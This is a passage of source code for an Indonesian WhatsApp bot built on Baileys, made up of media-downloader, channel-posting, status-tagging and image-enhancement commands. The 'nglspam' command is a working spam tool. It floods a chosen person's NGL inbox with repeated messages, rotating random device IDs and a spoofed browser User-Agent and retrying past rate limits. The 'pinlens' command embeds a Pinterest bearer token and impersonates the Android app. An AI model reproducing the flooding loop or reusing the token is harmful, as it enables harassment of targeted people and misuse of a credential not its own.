                    const pages = pin.story_pin_data.pages;
                    if (pages && pages.length > 0) {
                        const blocks = pages[0].blocks;
                        if (blocks && blocks.length > 0) {
                            const videoList = blocks[0].video && blocks[0].video.video_list;
                            if (videoList) {
                                return Object.values(videoList)
                                    .map(video => video.url)
                                    .filter(url => url); // Filter out empty URLs
                            }
                        }
                    }
                    return [];
                });
            return videoUrls;
        } catch (error) {
            return { error: error.message };
        }
    }

    const result = await PinterestVid(text);
    if (result.error) {
        reply(`Terjadi kesalahan: ${result.error}`);
    } else if (result.length === 0) {
        reply('ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ');
    } else {
        reply(`Hasil nya nih puqimak:\n\n${result.join('\n')}`);
    }}
    break;
    //fitur upch with audio and wm

case"upch":
case 'upsaluran':{
if (!text) return reply("reply audio\ncontoh: .upch (wm nya)")
RyuuBotz.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
RyuuBotz.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
RyuuBotz.sendMessage(`${global.idch}`, {audio: await quoted.download(), mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363351898733000@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${text}`,
newsletterJid: "120363351898733000@newsletter"}
}},{quoted: m})
await sleep(2000)
RyuuBotz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
reply(`mengirim audio ke channel berhasil`)
}
break
case 'playmusik': {
	if (!text) return reply(`ᴄᴏɴᴛᴏʜ: .playmusik ᴘᴇsᴀɴ ᴛᴇʀᴀᴋʜɪʀ `)
	try {		
		let search = await yts(`${text}`);
		if (!search || search.all.length === 0) return reply(`*ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ !* ☹️`);
		
		let { videoId, image, title, views, duration, author} = search.all[0];
		let caption = `「  *🎶 ʏ ᴏ ᴜ ᴛ ᴜ ʙ ᴇ  -  ᴘ ʟ ᴀ ʏ 🎶*  」
		ᴠɪᴇᴡs : ${views}
		ᴅᴜʀᴀsɪ : ${duration.timestamp}
		ᴄʜᴀɴɴᴇʟ : ${author.name}
		ᴜᴘʟᴏᴀᴅ : ${ago}`;
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
  "messageContextInfo": {
    "deviceListMetadata": {},
    "deviceListMetadataVersion": 2
  },
  interactiveMessage: proto.Message.InteractiveMessage.create({
   contextInfo: {
   mentionedJid: [m.sender]
    }, 
    body: proto.Message.InteractiveMessage.Body.create({
    text: caption
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
     text: `${global.footer}`,
    }),
    header: proto.Message.InteractiveMessage.Header.create({
    subtitle: "",
    hasMediaAttachment: true,...(await prepareWAMessageMedia({ 
         image: { url: image }
}, { upload: RyuuBotz.waUploadToServer }))
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
		 "name": "single_select",
		 "buttonParamsJson": `{
  "title": "Pilih",
  "sections": [
    {
      "title": "ᴅᴏᴡɴʟᴏᴀᴅ ᴀᴜᴅɪᴏ ʏᴏᴜᴛᴜʙᴇ 🎧",
      "rows": [
        {
          "header": "ᴀᴜᴅɪᴏ ᴅᴏᴡɴʟᴏᴀᴅ",
          "title": "ʏᴏᴜᴛᴜʙᴇ ᴀᴜᴅɪᴏ ᴜʟᴛʀᴀ ǫᴜᴀʟɪᴛʏ",
          "id": "ytmp3 ${url}"
        }
      ]
    },
    {
      "title": "ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ 🗃️",
      "rows": [
        {
          "header": "ᴠɪᴅᴇᴏ ᴅᴏᴡɴʟᴏᴀᴅ",
          "title": "ʏᴏᴜᴛᴜʙᴇ ᴠɪᴅᴇᴏ ᴜʟᴛʀᴀ ǫᴜᴀʟɪᴛʏ",
          "id": "ytmp4 ${url}"
        }
      ]
    }
  ]
}`
}],
})})}}
}, { userJid: m.chat, quoted: m })
RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
	} catch (err) {
	 reply('Terjadi Kesalahan Dalam Fitur Silahkan Lapor ketik *.raport teks*');
	}
}
break
case 'tagsw': {
    const baileys = require("@whiskeysockets/baileys");

    async function fetchParticipants(...jids) {
        let results = [];
        for (const jid of jids) {
            let { participants } = await RyuuBotz.groupMetadata(jid);
            participants = participants.map(({ id }) => id);
            results = results.concat(participants);
        }
        return results;
    }

    async function mentionStatus(jids, content) {
        const msg = await baileys.generateWAMessage(baileys.STORIES_JID, content, {
            upload: RyuuBotz.waUploadToServer
        });

        let statusJidList = [];
        for (const _jid of jids) {
            if (_jid.endsWith("@g.us")) {
                for (const jid of await fetchParticipants(_jid)) {
                    statusJidList.push(jid);
                }
            } else {
                statusJidList.push(_jid);
            }
        }
        statusJidList = [...new Set(statusJidList)];

        await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
            statusJidList,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map((jid) => ({
                                tag: "to",
                                attrs: { jid },
                                content: undefined
                            }))
                        }
                    ]
                }
            ]
        });

        for (const jid of jids) {
            let type = jid.endsWith("@g.us") ? "groupStatusMentionMessage" : "statusMentionMessage";
            await RyuuBotz.relayMessage(jid, {
                [type]: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined
                    }
                ]
            });
        }

        return msg;
    }

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    let content = {};

    if (mime) {
        let media = await q.download();

        if (/image/.test(mime)) {
            content.image = media;
        } else if (/video/.test(mime)) {
            content.video = media;
        } else if (/audio/.test(mime)) {
            content.audio = media;
        } else {
            return reply("Jenis file tidak didukung!");
        }

        if (q.text) content.caption = q.text;
    } else if (args[0]) {
        let url = args[0];
        let type = args[1] || 'text';

        if (type === 'image') {
            content.image = { url };
        } else if (type === 'video') {
            content.video = { url };
        } else if (type === 'audio') {
            content.audio = { url };
        } else {
            content.text = args.slice(1).join(" ") || url;
        }
    } else {
        return reply("Reply media atau masukkan URL dengan format:\n.tagsw <url> <image/video/audio/text>");
    }

    mentionStatus([m.chat], content).catch(console.error);
}
break;
case 'sholat': {
    const city = 'Jakarta'; // Ganti dengan kota
    const country = 'Indonesia'; // Ganti dengan negara
    startPrayerReminder(RyuuBotz, city, country);
    reply(`🕋 Pengingat sholat untuk *${city}, ${country}* diaktifkan di semua grup!`);
}
break
        case 'aiautoreply': 
        case 'aireply': 
        case 'ai-reply': 
        case 'auto-reply': 
        case 'autoreply': {
  if (!isRyuuTheCreator) return reply('Fitur ini hanya untuk owner ya.');

  if (args[0] === 'on') {
    global.aiAutoReply = true;
    reply('Auto-reply AI di chat pribadi *diaktifkan* ✅');
  } else if (args[0] === 'off') {
    global.aiAutoReply = false;
    reply('Auto-reply AI di chat pribadi *dimatikan* ❌');
  } else {
    reply('Gunakan:\n.autoreply on\n.autoreply off');
  }
  break;
}
case 'chord':
case 'cr': {
  if(!text) return reply(`masukan query`);
  let anu = `https://api.diioffc.web.id/api/search/chord?query=${encodeURIComponent(text)}`;
  const res = await fetch(anu)
  const response = await res.json();
  reply(`Url: ${response.result.url}\nArtis: ${response.result.artist}\nArtisUrl: ${response.result.artistUrl}\nJudul: ${response.result.title}\nChord: ${response.result.chord}`), { quoted: m };
}
break
case 'instagram':
case 'ig': {
        if (!text) return reply(`mana link instagram-nya? contoh: ${prefix + command} https://www.instagram.com/reel/DB8BGCZRKAh/?igsh=eDk1ajRncDV6Mjdh`);
    
        let memek = await igdl(text);
    
        let respon = memek.data;
        if (respon && respon.length > 0) {
        
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
                for (let mediaUrl of uniqueUrls) {
                    const headResponse = await axios.head(mediaUrl);
                    const mimeType = headResponse.headers['content-type'];

                    const isImage = /image\/.*/.test(mimeType);
                    const isVideo = /video\/.*/.test(mimeType);

                    if (isImage) {
                        await RyuuBotz.sendMessage(m.chat, {
                            image: { url: mediaUrl },
                            caption: "berhasil mendownload gambar dari URL."
                        }, { quoted: m });
                    } else if (isVideo || mimeType === 'application/octet-stream') {
                        await RyuuBotz.sendMessage(m.chat, {
                            video: { url: mediaUrl },
                            caption: "乂 *I N S T A G R A M  D O W N L O A D* 乂"
                  
                        }, { quoted: m });
                    } else {
                        await RyuuBotz.sendMessage(m.chat, {
                            text: `tipe media tidak didukung: ${mimeType}`
                        }, { quoted: m });
                    }
                }
            } catch (error) {
                console.error('Error fetching media type:', error);
                reply(error)
            }
        } else {
            await RyuuBotz.sendMessage(m.chat, {
                text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, { quoted: m });
        }
    }
    break;
      case'tt5':{
        if (!text) return reply(`mana link tiktok nya? contoh ${prefix + command} https://`);
         let res = await tiktok(text);
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await RyuuBotz.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await RyuuBotz.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await RyuuBotz.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await RyuuBotz.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await RyuuBotz.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await RyuuBotz.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      case 'jadihd':{
if (!m.quoted) return reply("Reply photo nya bloon")
const { remini } = require('./scrape/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
RyuuBotz.sendMessage(m.chat, { image: proses, caption:"Nihh Gambarnya jadi HD"}, { quoted: m})
}
break
      case 'nglspam': {
if (!isRyuuTheCreator) return reply(mess.prem)
 if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
 return reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam Reinz|haloo|5");
 }
async function sendSpamMessage(username, message, spamCount) {
 let counter = 0;
 while (counter < spamCount) {
 try {
 const date = new Date();
 const minutes = date.getMinutes();
 const hours = date.getHours();
 const formattedDate = `${hours}:${minutes}`;
 const deviceId = crypto.randomBytes(21).toString('hex');
 const url = 'https://ngl.link/api/submit';
 const headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
 'Accept': '*/*',
 'Accept-Language': 'en-US,en;q=0.5',
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'X-Requested-With': 'XMLHttpRequest',
 'Sec-Fetch-Dest': 'empty',
 'Sec-Fetch-Mode': 'cors',
 'Sec-Fetch-Site': 'same-origin',
 'Referer': `https://ngl.link/${username}`,
 'Origin': 'https://ngl.link'
 };
 const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

 const response = await fetch(url, {
 method: 'POST',
 headers,
 body,
 mode: 'cors',
 credentials: 'include'
 });

 if (response.status !== 200) {
 console.log(`[${formattedDate}] [Err] Ratelimited`);
 await new Promise(resolve => setTimeout(resolve, 25000));
 } else {
 counter++;
 console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
 }
 } catch (error) {
 console.error(`[${formattedDate}] [Err] ${error}`);
 await new Promise(resolve => setTimeout(resolve, 5000));
 }
 }
};
 const [username, message, count] = text.split("|");
 const spamCount = parseInt(count, 10);

 if (isNaN(spamCount) || spamCount <= 0) {
 return reply("Jumlah spam harus berupa angka positif!");
 }

 try {
 await sendSpamMessage(username, message, spamCount);
 reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
 } catch (e) {
 console.error(e); // Menambahkan logging error untuk debug
 return reply("Fitur error, coba lagi nanti.");
 }
}
//D|ts si pler 🐎
break 
case 'debug': {
  if (!m.quoted) return reply(`Balas pesan yang ingin kamu debug dengan command ini.`)

  try {
    const debugData = JSON.stringify(m.quoted, null, 2)
    const isTooLong = debugData.length > 4000

    if (isTooLong) {
      // Jika terlalu panjang, kirim sebagai file
      const fs = require('fs')
      const path = './node_modules/Arisu-MD/debug_message.json'
      fs.writeFileSync(path, debugData)

      await RyuuBotz.sendMessage(m.chat, {
        document: fs.readFileSync(path),
        mimetype: 'application/json',
        fileName: 'debug_message.json',
      }, { quoted: m })

      fs.unlinkSync(path) // hapus setelah dikirim
    } else {
      reply('```' + debugData + '```')
    }
  } catch (err) {
    console.error(err)
    reply('❌ Gagal melakukan debug.')
  }
}
break
case 'spoiler':
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`masukan text contoh ${command} kamujelek|tapii boong`)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
reply(l + readmore + r)
}
break 
case 'tiktok': case 'tt': {
 let momok = "`𝗧 𝗜 𝗞 𝗧 𝗢 𝗞 - 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗`"
if (!text.startsWith("https://")) return reply(example("url"))
await tiktokDl(q).then(async (result) => {
await RyuuBotz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: RyuuBotz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*TIKTOK - DOWNLOADER*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await RyuuBotz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")

await RyuuBotz.sendMessage(m.chat,{
			 video: {url:urlVid.url},
					caption: momok,
					footer: `\n${global.botname}`,
					buttons: [
						{
							buttonId: `.ttaudio ${text}`,
							buttonText: {
								displayText: "ᴀᴍʙɪʟ ᴍᴜsɪᴋɴʏᴀ"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
}).catch(e => console.log(e))
await RyuuBotz.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
case "reactch": 
case "rch": {
 if (!isRyuuTheCreator) return reply(mess.only.owner);
 if (!text) return reply("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️matz\n.reactch https://whatsapp.com/channel/xxx/123 ❤️matz|5");

 const hurufGaya = {
 a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
 h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
 o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
 v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
 '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
 '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒', ' ': '➖'
 };

 const [mainText, offsetStr] = text.split('|');
 const argsa = mainText.trim().split(" ");
 const link = argsa[0];

 if (!link.includes("https://whatsapp.com/channel/")) {
 return reply("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤️matz|3");
 }

 const channelId = link.split('/')[4];
 const rawMessageId = parseInt(link.split('/')[5]);
 if (!channelId || isNaN(rawMessageId)) return reply("Link tidak lengkap!");
 const offset = parseInt(offsetStr?.trim()) || 1;
 const teksNormal = argsa.slice(1).join(' ');
 const teksTanpaLink = teksNormal.replace(link, '').trim();
 if (!teksTanpaLink) return reply("Masukkan teks/emoji untuk direaksikan.");
 const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
 if (c === ' ') return '―';
 return hurufGaya[c] || c;
 }).join('');

 try {
 const metadata = await RyuuBotz.newsletterMetadata("invite", channelId);
 let success = 0, failed = 0;
 for (let i = 0; i < offset; i++) {
 const msgId = (rawMessageId - i).toString();
 try {
 await RyuuBotz.newsletterReactMessage(metadata.id, msgId, emoji);
 success++;
 } catch (e) {
 failed++;
 }
 }
 reply(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
 } catch (err) {
 console.error(err);
 reply("❌ Gagal memproses permintaan!");
 }
}
break;
    case "hd5": {
if (!quoted) return replyreinz(`reply gambar dengan caption ${prefix + command}`);
if (!/image/.test(mime)) return replyreinz("dengan kirim/reply foto")
await RyuuBotz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
try {
const { remini } = require("./lib/hd.js");
let media = await quoted.download();
let enhanced = await remini(media, "enhance"); // Enhance pertama
enhanced = await remini(enhanced, "enhance"); // Enhance kedua
enhanced = await remini(enhanced, "enhance"); // Enhance ketiga    
RyuuBotz.sendFile(m.chat, enhanced, "", "_Sukses Membuat HD 3x Enhance✅_", m);
} catch (err) {
console.error(err);
await RyuuBotz.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
}
break;
case 'pinlens': {
  const q = m.quoted ? m.quoted : m
  const mime = (q.msg || q).mimetype || ''

  if (!mime.startsWith('image/')) {
    return reply(`Kirim/reply gambar dengan caption *${prefix + command}*`)
  }

  await RyuuBotz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
  reply('Sedang mencari di Pinterest...')

  const buffer = await q.download()
  const form = new FormData()
  form.append('camera_type', '0')
  form.append('source_type', '1')
  form.append('video_autoplay_disabled', '0')
  form.append('page_size', '10')
  form.append('fields', `
    storypinvideoblock.{block_type,video_signature,block_style,video[V_HLSV3_MOBILE, V_DASH_HEVC, V_HEVC_MP4_T1_V2, V_HEVC_MP4_T2_V2, V_HEVC_MP4_T3_V2, V_HEVC_MP4_T4_V2, V_HEVC_MP4_T5_V2],type},
    storypinimageblock.{image_signature,block_type,block_style,type},
    linkblock.{image_signature,src_url,normalized_url,block_type,image[345x],text,type,canonical_url},
    domain.{official_user()},
    collectionpinitem.{image_signature,images,dominant_color,link,pin_id,title},
    collectionpin.{root_pin_id,item_data},
    userwebsite.{official_user()},
    storypindata.{has_affiliate_products,static_page_count,pages_preview,metadata(),page_count,has_product_pins,total_video_duration},
    storypinpage.{layout,image_signature,video_signature,blocks,image_signature_adjusted,video[V_HLSV3_MOBILE, V_DASH_HEVC, V_HEVC_MP4_T1_V2, V_HEVC_MP4_T2_V2, V_HEVC_MP4_T3_V2, V_HEVC_MP4_T4_V2, V_HEVC_MP4_T5_V2],style,id,type,music_attributions,should_mute},
    pincarouseldata.{index,id,rich_summary(),rich_metadata(),carousel_slots},
    pincarouselslot.{rich_summary,item_id,domain,android_deep_link,link,details,images[345x,750x],id,ad_destination_url,title,rich_metadata},
    pin.{comment_count,is_eligible_for_related_products,shopping_flags,pinner(),promoted_is_lead_ad,ad_match_reason,destination_url_type,promoted_quiz_pin_data,promoted_is_showcase,type,carousel_data(),image_crop,story_pin_data_id,call_to_create_responses_count,promoted_is_removable,is_owned_by_viewer,digital_media_source_type,auto_alt_text,id,ad_destination_url,embed,ad_group_id,rich_summary(),grid_title,native_creator(),cacheable_id,source_interest(),is_native,has_variants,promoted_is_auto_assembled,is_premiere,is_eligible_for_web_closeup,promoted_is_quiz,done_by_me,closeup_description,creative_enhancement_slideshow_aspect_ratio,promoted_android_deep_link,is_oos_product,is_video,reaction_by_me,promoted_is_catalog_carousel_ad,dominant_color,virtual_try_on_type,promoted_is_sideswipe_disabled,domain,call_to_action_text,is_stale_product,link_domain(),music_attributions,collection_pin(),shopping_mdl_browser_type,is_promoted,ad_data(),recommendation_reason,ad_targeting_attribution(),link,sponsorship,is_unsafe,is_hidden,description,created_at,link_user_website(),title,is_cpc_ad,is_scene,image_signature,total_reaction_count,promoted_is_max_video,is_eligible_for_pre_loved_goods_label,tracking_params,alt_text,dpa_creative_type,promoted_lead_form(),is_eligible_for_pdp,is_visualization_enabled,is_unsafe_for_comments,is_call_to_create,ip_eligible_for_stela,dark_profile_link,via_pinner,is_downstream_promotion,promoter(),reaction_counts,should_open_in_stream,shuffle(),aggregated_pin_data(),is_repin,videos(),top_interest,category,story_pin_data(),should_mute,board(),is_virtual_try_on},
    user.{country,gender,type,age_in_years,follower_count,explicitly_followed_by_me,is_default_image,is_under_16,is_under_18,save_behavior,is_partner,id,is_verified_merchant,first_name,should_default_comments_off,show_creator_profile,last_name,avatar_color_index,is_private_profile,custom_gender,partner(),full_name,allow_idea_pin_downloads,image_medium_url,username,should_show_messaging,vto_beauty_access_status},
    board.{is_collaborative,collaborating_users(),created_at,privacy,should_show_shop_feed,type,is_ads_only,url,image_cover_url,layout,collaborated_by_me,followed_by_me,should_show_board_collaborators,owner(),name,collaborator_invites_enabled,action,section_count,id,category},
    video.{duration,id,video_list[V_HLSV3_MOBILE, V_DASH_HEVC]},
    richpinproductmetadata.{label_info,offers,additional_images,has_multi_images,shipping_info,offer_summary,item_set_id,item_id,name,id,type,brand},
    aggregatedpindata.{is_shop_the_look,comment_count,collections_header_text,is_stela,has_xy_tags,pin_tags,did_it_data,catalog_collection_type,slideshow_collections_aspect_ratio,aggregated_stats,id,is_dynamic_collections,pin_tags_chips},
    shuffle.{source_app_type_detailed,id},
    pin.images[200x,236x,736x,290x],
    storypinimageblock.image[200x,236x,736x,290x],
    storypinpage.image[200x,236x,736x,290x,1200x],
    storypinpage.image_adjusted[200x,236x,736x,290x,1200x]
  `)
  form.append('image', buffer, `pin_${Date.now()}.jpg`)

  try {
    const { data } = await axios.post('https://api.pinterest.com/v3/visual_search/lens/search/', form, {
      headers: {
        ...form.getHeaders(),
        'accept-encoding': 'gzip',
        'accept-language': 'id-ID',
        authorization: 'Bearer pina_AEATFWAVACTX4BAAGCABWDKDXW24RFYBABHO2LQZE7QWDFBYK7SBZDSEAAEEFCNZWYXAMRAB6RUKR5JMDUIGIZHZXDDXLWQA',
        'user-agent': 'Pinterest for Android/12.46.2',
        'x-node-id': 'true',
        'x-pinterest-app-type-detailed': '3',
        'x-pinterest-appstate': 'active'
      }
    })

    if (!data.data || data.data.length === 0) return reply("Error, Foto Tidak Ditemukan")

    let selectedPins = data.data.slice(0, 10)
    let cards = []

    for (let i = 0; i < selectedPins.length; i++) {
      const pin = selectedPins[i]
      const imageUrl = pin.images?.['736x']?.url || pin.images?.['236x']?.url
      const sourceUrl = `https://pinterest.com/pin/${pin.id}/`

      if (!imageUrl) continue

      let imgMedia = await prepareWAMessageMedia(
        { image: { url: imageUrl } },
        { upload: RyuuBotz.waUploadToServer }
      )

      cards.push({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: `Gambar ke *${cards.length + 1}*`,
          hasMediaAttachment: true,
          ...imgMedia
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [{
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Lihat di Pinterest",
              url: sourceUrl
            })
          }]
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: "© Ryuu Reinzz 2022 - 2025"
        })
      })
    }

    if (cards.length === 0) return reply("Tidak ada gambar valid ditemukan.")

    const msg = await generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: `🔎 Berikut hasil pencarian gambar dari foto kamu`
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: cards
            })
          })
        }
      }
    }, {
      userJid: sender,
      quoted: m
    })

    RyuuBotz.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

  } catch (e) {
    reply(`Error: ${e.message}`)
    }
  }
  break
case 'pin':
case 'pinterest': {
    if (!text) return reply(`Format salah, contoh: \n${prefix + command} Anime`)

    await RyuuBotz.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
    
    let anutrest = await pinterest(text) // Ambil hasil pencarian
    if (!anutrest || anutrest.length === 0) return reply("Error, Foto Tidak Ditemukan")

    // Ambil maksimal 10 gambar biar nggak terlalu panjang
    let selectedImages = anutrest.slice(0, 10);
    let anu = []

    for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia(
            { image: { url: selectedImages[i].image } }, 
            { upload: RyuuBotz.waUploadToServer }
        )

        anu.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `Gambar ke *${i + 1}*`, 
                hasMediaAttachment: true,
                ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Lihat di Pinterest",
                        url: selectedImages[i].source || selectedImages[i].image
                    })
                }]
            }), 
            footer: proto.Message.InteractiveMessage.Footer.create({
                text: "© Ryuu Reinzz 2022 - 2025"
            })
        })
    }

    // Buat format `carouselMessage`
    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `🔎 Berikut hasil pencarian gambar untuk *${text}*`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: anu
                    })
                })
            }
        }
    }, {
        userJid: sender,
        quoted: m
    })

    RyuuBotz.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
//===============================
case 'spotifysearch': {
 if (!text) return reply(`Masukkan judul yang ingin di search, Contoh: ${prefix + command} suzume`);

 const searchQuery = text.trim();
 reply('🔍 Sedang mencari hasil, mohon tunggu sebentar...');

 try {
 const searchResponse = await axios.get(`http://kinchan.sytes.net/spotify/search?query=${encodeURIComponent(searchQuery)}`);
 const searching = searchResponse.data.data;

 if (!searching || !searching.tracks || searching.tracks.length === 0) {
 return reply('❌ Tidak ditemukan hasil untuk pencarian ini.');
 }

 let resultText = `🎵 *Hasil Pencarian Spotify untuk:* "${searchQuery}"\n\n`;
 searching.tracks.forEach((track, index) => {
 resultText += `*${index + 1}. ${track.title}*\n`;
 resultText += `🎤 *Artis:* ${track.artists}\n`;
 resultText += `💿 *Album:* ${track.album}\n`;
 resultText += `⏳ *Duration:* ${Math.floor(track.duration / 60000)}:${((track.duration % 60000) / 1000).toFixed(0).padStart(2, '0')} menit\n`;
 resultText += `📅 *Release:* ${track.release_date}\n`;
 resultText += `🔗 *Spotify Link:* ${track.link}\n`;
 resultText += `🆔 *ISRC:* ${track.isrc}\n`;
 resultText += `\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
 });

 await RyuuBotz.sendMessage(m.chat, {
 image: { url: searching.tracks[0].cover_url },
 caption: resultText.trim()
 }, { quoted: m });

 } catch (error) {
 console.error(error);
 reply('❌ Terjadi kesalahan saat mencari hasil, silahkan coba lagi.');
 }
}
break
// case 'spotifydl': {
    // if (!text) return reply(`Silahkan berikan link, Contoh: ${prefix + command} https://open.spotify.com/track/2ROE7pfI8Monc5n13T3Tmt`);

    // const spotifyLink = text.trim();

    // try {
        // const metaResponse = await axios.get(`http://kinchan.sytes.net/spotify/meta?url=${encodeURIComponent(spotifyLink)}`);
        // const metadata = metaResponse.data.data;

        // if (!metadata.title || !metadata.artists) {
            // return reply('❌ Gagal mengambil metadata, pastikan link benar');
        // }

     // reply(`*乂 SPOTIFY - DOWNLOADER*\n\n` +
            // `🎶 *Judul:* ${metadata.title}\n` +
            // `🎤 *Artis:* ${metadata.artists}\n` +
            // `💿 *Album:* ${metadata.album}\n` +
